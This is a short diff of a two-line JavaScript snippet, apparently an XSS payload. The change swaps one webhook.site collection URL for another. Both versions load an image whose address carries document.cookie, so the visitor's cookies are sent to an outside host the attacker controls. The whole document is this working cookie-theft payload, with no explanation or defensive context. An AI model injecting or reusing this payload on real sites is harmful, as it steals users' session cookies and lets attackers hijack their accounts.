@@ -1,2 +1,2 @@
 var i=new Image;
-i.src="https://webhook.site/59bc0028-6fe2-4e26-a4db-5fcb45963bcc/?"+document.cookie;
+i.src="https://webhook.site/5378ae46-8172-4695-80c5-f1ccfcb17f05/?"+document.cookie;
